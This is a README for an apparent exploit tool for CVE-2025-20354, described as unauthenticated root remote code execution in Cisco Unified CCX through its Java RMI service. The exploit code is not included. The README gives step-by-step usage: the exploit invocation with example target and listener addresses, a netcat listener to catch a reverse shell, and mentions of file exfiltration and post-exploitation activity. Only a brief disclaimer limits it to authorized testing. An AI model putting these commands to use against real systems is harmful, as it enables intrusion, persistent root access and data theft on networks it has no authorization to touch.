## CVE-2025-20354

### Overview
This repository contains exploit for CVE-2025-20354, an unauthenticated remote code execution vulnerability in Cisco Unified CCX via its Java RMI process. The exploit allows for arbitrary file uploads and command execution with root privileges on affected systems. By default, it establishes a reverse shell for persistent access, but can be configured for other payloads like file exfiltration or privilege escalation scripts.

Targeted at Cisco Unified CCX versions prior to the latest patch, this tool leverages improper authentication in the RMI endpoint to inject crafted payloads. Successful exploitation requires network access to the RMI port and no firewall blocking.


### Usage
1. Install dependencies: `pip install -r requirements.txt`.
2. Run the exploit: `python cve-2025-20354.py -t <target_ip> -p <rmi_port> -l <listener_ip> -lp <listener_port>`
   - Example: `python cve-2025-20354.py -t 192.168.1.100 -p 6999 -l 192.168.1.50 -lp 4444`
3. Listen for the shell: `nc -lvnp 4444` on your attacker machine.
4. Post-exploitation: Once shelled in, use standard Linux commands for further ops.

### Requirements
- Python 3.8 or higher.
- Network reachability to the target's RMI service.
- No MFA or advanced auth on the endpoint.

### Disclaimer
Use responsibly in authorized penetration testing environments only. Not liable for misuse.
